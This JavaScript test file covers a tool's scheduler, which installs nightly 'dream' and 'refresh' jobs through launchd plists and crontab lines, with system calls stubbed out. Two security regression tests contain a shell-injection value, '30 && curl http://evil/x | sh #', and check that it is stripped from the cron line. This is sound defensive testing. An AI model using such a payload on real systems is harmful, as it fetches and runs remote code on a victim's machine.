// Tests for C2: scheduling the nightly `keyflip dream` (src/schedule.js). All system calls
// (launchctl/crontab) go through an injected runner and a temp home, so nothing touches the
// real machine.
import test from 'node:test';
import assert from 'node:assert';
import fs from 'fs';
import os from 'os';
import path from 'path';
import { fileURLToPath } from 'url';
import * as schedule from '../src/schedule.js';

function fakeRunner(recorder, cronState) {
  return function (cmd, args, input) {
    recorder.push({ cmd: cmd, args: args, input: input });
    if (cmd === 'which') return { code: 0, stdout: '/usr/local/bin/keyflip\n' };
    if (cmd === 'crontab' && args[0] === '-l') return { code: 0, stdout: cronState.text || '' };
    if (cmd === 'crontab' && args[0] === '-') {
      cronState.text = input;
      return { code: 0 };
    }
    return { code: 0, stdout: '' };
  };
}

test('parseAt clamps a HH:MM; buildPlist embeds the dream command + time', function () {
  assert.deepStrictEqual(schedule.parseAt('03:30'), { h: 3, m: 30 });
  assert.deepStrictEqual(schedule.parseAt('bogus'), { h: 3, m: 0 });
  const plist = schedule.buildPlist({
    at: '04:15',
    days: 30,
    run: function () {
      return { code: 1 };
    },
  });
  assert.ok(plist.indexOf('<key>Hour</key><integer>4</integer>') !== -1);
  assert.ok(plist.indexOf('<key>Minute</key><integer>15</integer>') !== -1);
  assert.ok(plist.indexOf('dream') !== -1 && plist.indexOf('--apply') !== -1);
  assert.ok(plist.indexOf(schedule.LABEL) !== -1);
});

test('cronLine encodes the schedule + a managed marker; installCron is idempotent', function () {
  const rec = [],
    cron = { text: '0 0 * * * other-job\n' };
  const runner = fakeRunner(rec, cron);
  const line = schedule.cronLine({ at: '02:05', days: 14, run: runner });
  assert.ok(/^5 2 \* \* \* /.test(line), 'minute hour * * *');
  assert.ok(line.indexOf(schedule.CRON_MARK) !== -1);

  schedule.installCron({ at: '02:05', days: 14, run: runner });
  assert.ok(cron.text.indexOf('other-job') !== -1, 'existing crontab preserved');
  assert.ok(cron.text.indexOf(schedule.CRON_MARK) !== -1, 'keyflip line added');
  // installing again must not duplicate the managed line
  schedule.installCron({ at: '02:05', days: 14, run: runner });
  const count = (cron.text.match(new RegExp('keyflip-dream', 'g')) || []).length;
  assert.strictEqual(count, 1, 'no duplicate managed line');
});

test('uninstallCron removes only the managed line, keeps the rest', function () {
  const rec = [],
    cron = { text: '0 0 * * * other-job\n5 2 * * * something ' + schedule.CRON_MARK + '\n' };
  const runner = fakeRunner(rec, cron);
  const r = schedule.uninstallCron({ run: runner });
  assert.strictEqual(r.existed, true);
  assert.ok(cron.text.indexOf('other-job') !== -1);
  assert.strictEqual(cron.text.indexOf(schedule.CRON_MARK), -1);
});

test('install/uninstall on macOS writes + removes the launchd plist (temp home)', function () {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'keyflip-sched-'));
  const rec = [];
  const runner = fakeRunner(rec, {});
  const ctx = { platform: 'darwin' };
  const r = schedule.install(ctx, { at: '03:00', days: 30, home: home, run: runner });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.kind, 'launchd');
  assert.ok(fs.existsSync(schedule.plistPath(home)), 'plist written');
  assert.ok(
    rec.some(function (c) {
      return c.cmd === 'launchctl' && c.args[0] === 'load';
    }),
    'launchctl load called',
  );
  const u = schedule.uninstall(ctx, { home: home, run: runner });
  assert.strictEqual(u.ok, true);
  assert.strictEqual(fs.existsSync(schedule.plistPath(home)), false, 'plist removed');
});

test('the schedule records which LLM provider it will spend, and drops the record on uninstall', function () {
  // #40: a nightly job that quietly starts burning subscription quota is a bill nobody agreed to,
  // so `install` records the provider it was set up with and `status` can compare it to live config.
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'keyflip-sched-'));
  const configDir = path.join(home, '.config', 'keyflip');
  fs.mkdirSync(configDir, { recursive: true });
  const runner = fakeRunner([], {});
  const ctx = { platform: 'darwin', configDir: configDir };
  const rec = schedule.install(ctx, {
    at: '02:15',
    days: 45,
    home: home,
    run: runner,
    provider: 'ollama',
    model: 'qwen2.5:7b-instruct',
  });
  assert.strictEqual(rec.ok, true);
  const st = schedule.status(ctx, { home: home, run: runner });
  assert.ok(st.recorded, 'status must carry the install-time receipt');
  assert.strictEqual(st.recorded.provider, 'ollama');
  assert.strictEqual(st.recorded.model, 'qwen2.5:7b-instruct');
  assert.strictEqual(st.recorded.days, 45);
  assert.deepStrictEqual(st.recorded.at, { h: 2, m: 15 });
  assert.ok(st.recorded.installedAt, 'when it was agreed to');
  // It lives in the state dir (a git repo), so it must be metadata-only + private.
  const file = path.join(configDir, schedule.RECORD_NAME);
  assert.match(fs.readFileSync(file, 'utf8'), /ollama/);
  assert.strictEqual(fs.statSync(file).mode & 0o777, 0o600, 'the record is 0600');
  schedule.uninstall(ctx, { home: home, run: runner });
  assert.strictEqual(fs.existsSync(file), false, 'unscheduling drops the record');
  assert.strictEqual(schedule.status(ctx, { home: home, run: runner }).recorded, null);
});

test('a schedule installed with no config dir still works (the record is best-effort)', function () {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'keyflip-sched-'));
  const runner = fakeRunner([], {});
  const r = schedule.install({ platform: 'darwin' }, { at: '03:00', days: 30, home: home, run: runner });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(schedule.status({ platform: 'darwin' }, { home: home, run: runner }).recorded, null);
});

test('scheduling is unsupported off macOS/Linux', function () {
  const r = schedule.install({ platform: 'win32' }, {});
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.kind, 'unsupported');
});

// SECURITY (review P0 #3): older_than_days flows unescaped into the Linux cron /bin/sh -c
// line via the MCP path (no server-side schema validation). It MUST be coerced to a bounded
// integer at the schedule boundary so it can never carry shell metacharacters.
test('cronLine coerces a malicious days value to a bounded integer (no shell injection)', function () {
  const runner = fakeRunner([], {});
  const evil = '30 && curl http://evil/x | sh #';
  const line = schedule.cronLine({ days: evil, run: runner });
  assert.strictEqual(line.indexOf('curl'), -1, 'injected command must not survive into the cron line');
  assert.strictEqual(line.indexOf('&&'), -1, 'shell metacharacters must not survive');
  assert.ok(/--older-than 30d(\s|$)/.test(line), 'the numeric prefix is kept as a clean 30d, nothing more: ' + line);
  // out-of-range / non-numeric fall back or clamp
  assert.ok(/--older-than 1d(\s|$)/.test(schedule.cronLine({ days: -5, run: runner })), 'clamped to >=1');
  assert.ok(/--older-than 3650d(\s|$)/.test(schedule.cronLine({ days: 999999, run: runner })), 'clamped to <=3650');
  assert.ok(
    /--older-than 30d(\s|$)/.test(schedule.cronLine({ days: 'garbage', run: runner })),
    'non-numeric -> default 30',
  );
});

// #36: the SECOND scheduled job — `keyflip refresh --all`, so a 6-day token cannot quietly expire
// between switches. These tests pin the thing that makes two jobs safe: each one has its own label,
// marker, receipt and plist path, so installing/removing one can never clobber the other, and a
// refresh schedule can never silently turn into a dream schedule.
test('the refresh job has its own label, marker, receipt and default hour', function () {
  assert.strictEqual(schedule.REFRESH_LABEL, 'com.keyflip.refresh');
  assert.notStrictEqual(schedule.REFRESH_LABEL, schedule.LABEL);
  assert.notStrictEqual(schedule.REFRESH_CRON_MARK, schedule.CRON_MARK);
  assert.notStrictEqual(schedule.REFRESH_RECORD_NAME, schedule.RECORD_NAME);
  assert.deepStrictEqual(schedule.whenOf({ job: 'refresh' }), { h: 4, m: 30 });
  assert.deepStrictEqual(schedule.whenOf({ job: 'dream' }), { h: 3, m: 0 });
  // A job-less call is a dream call: every call site written before #36 keeps its meaning.
  assert.deepStrictEqual(schedule.whenOf({}), { h: 3, m: 0 });
  assert.strictEqual(schedule.jobOf({}).name, 'dream');
  assert.strictEqual(schedule.jobOf({ job: 'nonsense' }).name, 'dream', 'an unknown job cannot invent a schedule');
  const line = schedule.cronLine({ job: 'refresh', run: fakeRunner([], {}) });
  assert.ok(/refresh --all/.test(line), line);
  assert.ok(/^30 4 \* \* \* /.test(line), 'its default hour is its own: ' + line);
  assert.ok(line.indexOf(schedule.REFRESH_CRON_MARK) !== -1);
  assert.strictEqual(line.indexOf('dream'), -1, 'a refresh schedule must not quietly be a dream schedule');
});

test('the refresh command line is a fixed argv — nothing from opts can ride into it', function () {
  // The dream had to harden `older_than_days` because it reaches the cron /bin/sh -c line from the
  // MCP path. The refresh job is safe by CONSTRUCTION: it reads no opts into argv at all. Pinning
  // that here is what stops a future "just pass through --archive" from reintroducing the hole.
  const runner = fakeRunner([], {});
  const evil = '30 && curl http://evil/x | sh #';
  const line = schedule.cronLine({ job: 'refresh', days: evil, archive: true, run: runner });
  assert.strictEqual(line.indexOf('curl'), -1);
  assert.strictEqual(line.indexOf('&&'), -1);
  assert.strictEqual(line.indexOf('--older-than'), -1, 'the dream flags do not leak into the refresh job');
  assert.strictEqual(line.indexOf('--archive'), -1);
  const cmd = schedule.refreshCommand({
    run: function () {
      return { code: 0, stdout: '/usr/local/bin/keyflip\n' };
    },
  });
  assert.deepStrictEqual(cmd.args, ['refresh', '--all']);
});

test('every scheduled job declares AbandonProcessGroup and its own log paths', function () {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'keyflip-sched-'));
  ['dream', 'refresh'].forEach(function (job) {
    const plist = schedule.buildPlist({ job: job, home: home, run: fakeRunner([], {}) });
    // Verified live: launchd kills the job's whole process group when the job exits, which murdered
    // the detached workers a scheduled dream used to start. A schedule without this is a silent loss.
    assert.ok(plist.indexOf('<key>AbandonProcessGroup</key><true/>') !== -1, job + ' keeps detached children');
    assert.ok(plist.indexOf('<key>StandardOutPath</key>') !== -1, job + ' stdout is captured');
    assert.ok(plist.indexOf('<key>StandardErrorPath</key>') !== -1, job + ' stderr is captured');
    assert.ok(
      plist.indexOf('Library/Logs/' + job + '-keyflip.log') !== -1,
      job + ' logs under its own name — a job nobody can read after it ran cannot be debugged',
    );
  });
});

test('dream and refresh coexist: two plists, two receipts, removing one leaves the other', function () {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'keyflip-sched-'));
  const configDir = path.join(home, '.config', 'keyflip');
  fs.mkdirSync(configDir, { recursive: true });
  const rec = [];
  const runner = fakeRunner(rec, {});
  const ctx = { platform: 'darwin', configDir: configDir };
  assert.strictEqual(schedule.install(ctx, { job: 'refresh', at: '04:30', home: home, run: runner }).ok, true);
  assert.strictEqual(schedule.install(ctx, { job: 'dream', at: '03:00', home: home, run: runner }).ok, true);
  const rp = schedule.plistPath(home, { job: 'refresh' });
  const dp = schedule.plistPath(home, { job: 'dream' });
  assert.notStrictEqual(rp, dp, 'two jobs, two plists — sharing one path would clobber the other');
  assert.ok(fs.existsSync(rp) && fs.existsSync(dp), 'both plists are written');
  assert.ok(
    rec.some(function (c) {
      return c.cmd === 'launchctl' && c.args[0] === 'load' && c.args[1] === rp;
    }),
    'launchctl was pointed at the refresh plist, not only the dream one',
  );
  const rrec = schedule.status(ctx, { job: 'refresh', home: home, run: runner }).recorded;
  assert.strictEqual(rrec.job, 'refresh');
  // A refresh job calls no model, so it must not receipt a provider: that is a bill it cannot incur,
  // and doctor's chore-provider check compares the live llm.provider against the DREAM receipt.
  assert.strictEqual(rrec.provider, undefined);
  assert.strictEqual(rrec.days, undefined);
  const drec = schedule.status(ctx, { job: 'dream', home: home, run: runner }).recorded;
  assert.strictEqual(drec.job, 'dream');
  assert.strictEqual(drec.provider, 'claude', 'the dream still records what it will spend');
  schedule.uninstall(ctx, { job: 'refresh', home: home, run: runner });
  assert.strictEqual(fs.existsSync(rp), false, 'the refresh plist is gone');
  assert.strictEqual(fs.existsSync(dp), true, 'the dream is still scheduled');
  assert.strictEqual(fs.existsSync(path.join(configDir, schedule.REFRESH_RECORD_NAME)), false);
  assert.ok(fs.existsSync(path.join(configDir, schedule.RECORD_NAME)), 'the dream receipt survives');
  assert.strictEqual(schedule.status(ctx, { job: 'refresh', home: home, run: runner }).installed, false);
  assert.strictEqual(schedule.status(ctx, { job: 'dream', home: home, run: runner }).installed, true);
});

test('on Linux each job gets its own crontab line, and removing one keeps the other', function () {
  const rec = [],
    cron = { text: '0 0 * * * other-job\n' };
  const runner = fakeRunner(rec, cron);
  const ctx = { platform: 'linux' };
  schedule.install(ctx, { job: 'dream', at: '03:00', run: runner });
  schedule.install(ctx, { job: 'refresh', at: '04:30', run: runner });
  schedule.install(ctx, { job: 'refresh', at: '04:30', run: runner });
  const lines = function (mark) {
    return cron.text.split(mark).length - 1;
  };
  assert.strictEqual(lines(schedule.REFRESH_CRON_MARK), 1, 're-installing refresh does not duplicate it');
  assert.strictEqual(lines(schedule.CRON_MARK), 1, 'installing refresh does not duplicate the dream either');
  assert.strictEqual((cron.text.match(/other-job/g) || []).length, 1, "the user's own cron job is preserved");
  assert.strictEqual(schedule.status(ctx, { run: runner }).installed, true);
  assert.strictEqual(schedule.status(ctx, { job: 'refresh', run: runner }).installed, true);
  schedule.uninstall(ctx, { job: 'refresh', run: runner });
  assert.strictEqual(cron.text.indexOf(schedule.REFRESH_CRON_MARK), -1);
  assert.ok(cron.text.indexOf(schedule.CRON_MARK) !== -1, 'the dream line survives');
  assert.strictEqual(schedule.status(ctx, { job: 'refresh', run: runner }).installed, false);
  assert.strictEqual(schedule.status(ctx, { run: runner }).installed, true);
});

test('an unscheduled refresh reports honestly, and off-macOS/Linux no job installs', function () {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'keyflip-sched-'));
  const runner = fakeRunner([], {});
  const st = schedule.status({ platform: 'darwin' }, { job: 'refresh', home: home, run: runner });
  assert.strictEqual(st.installed, false);
  assert.strictEqual(st.job, 'refresh');
  assert.strictEqual(st.recorded, null, 'no receipt yet — status must not invent one');
  const r = schedule.install({ platform: 'win32' }, { job: 'refresh' });
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.kind, 'unsupported');
});

// REGRESSION (found by reading the plist keyflip actually installed, not by a green suite): a job
// whose ProgramArguments are `[node, refresh, --all]` launches node with no script and dies on a
// missing file. The scheduler resolves `which keyflip`, and a `.js` bin must become
// `[node, <script>, <subcommand>, …]` — with the script IN the argv. Substring greps for "dream" or
// "refresh --all" pass on that broken plist, so this asserts the whole argument list.
function plistArgs(plist) {
  const block = /<key>ProgramArguments<\/key>\s*<array>([\s\S]*?)<\/array>/.exec(plist);
  if (!block) return null;
  return (block[1].match(/<string>([\s\S]*?)<\/string>/g) || []).map(function (s) {
    return s
      .replace(/<\/?string>/g, '')
      .replace(/&amp;/g, '&')
      .replace(/&lt;/g, '<')
      .replace(/&gt;/g, '>');
  });
}
test('ProgramArguments are the full command: a .js bin is run as `node <script> <job…>`, never `node <job…>`', function () {
  const repoBin = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'bin', 'keyflip.js');
  // 1) An installed binary: executed directly, argv is only the job.
  const installed = fakeRunner([], {}); // returns /usr/local/bin/keyflip for `which`
  const a = plistArgs(schedule.buildPlist({ job: 'refresh', run: installed }));
  assert.deepStrictEqual(a, ['/usr/local/bin/keyflip', 'refresh', '--all']);
  const d = plistArgs(schedule.buildPlist({ job: 'dream', days: 21, run: installed }));
  assert.deepStrictEqual(d, ['/usr/local/bin/keyflip', 'dream', '--apply', '--older-than', '21d']);
  // 2) No installed keyflip (the dev checkout): node + THE SCRIPT + the job. The script must survive.
  const noKeyflip = function (cmd, args) {
    if (cmd === 'which') return { code: 1, stdout: '' };
    return { code: 0, stdout: '' };
  };
  const r = plistArgs(schedule.buildPlist({ job: 'refresh', run: noKeyflip }));
  assert.strictEqual(r[0], process.execPath, 'run by node');
  assert.strictEqual(r[1], repoBin, 'the keyflip script is argv[1] — without it this job cannot run');
  assert.deepStrictEqual(r.slice(2), ['refresh', '--all']);
  const dm = plistArgs(schedule.buildPlist({ job: 'dream', run: noKeyflip }));
  assert.strictEqual(dm[1], repoBin, 'the dream fallback carries the script too');
  // 3) The Linux line is the same command, shell-joined.
  const cl = schedule.cronLine({ job: 'refresh', run: noKeyflip });
  assert.ok(cl.indexOf(process.execPath + ' ' + repoBin + ' refresh --all') !== -1, cl);
});
